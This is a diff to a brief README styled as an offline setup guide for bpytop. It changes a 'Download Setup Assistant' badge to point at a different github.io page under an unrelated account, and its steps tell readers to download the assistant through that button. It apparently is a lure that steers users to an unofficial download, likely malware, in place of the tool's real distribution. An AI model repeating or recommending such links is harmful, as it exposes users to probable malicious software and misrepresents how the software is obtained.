@@ -1,6 +1,6 @@
 # bpytop — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://bpytop-freedownload-info.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://vertie311.github.io/.github/bpytop)
 
 ⚙️ How to Use  
 1. Download the setup assistant using the button above  
